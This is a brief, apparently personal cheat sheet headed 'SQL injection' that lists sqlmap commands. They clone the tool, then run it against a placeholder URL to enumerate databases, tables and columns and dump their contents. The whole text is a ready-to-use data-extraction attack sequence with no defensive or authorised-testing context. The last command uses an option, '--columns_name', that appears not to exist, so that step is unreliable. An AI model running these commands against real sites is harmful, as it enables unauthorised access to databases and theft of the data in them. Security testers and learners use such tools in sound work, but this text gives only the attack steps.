#SQL injection
1)git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
2)python sqlmap.py -h
3)python sqlmap.py -u <url> --batch --dbs
4)python sqlmap.py -u <url> --batch -D database_name --tables
5)python sqlmap.py -u <url> --batch -D database_name -T table-name --columns
6)python sqlmap.py -u <url> --batch -D database_name -T table-name --columns_name --dump
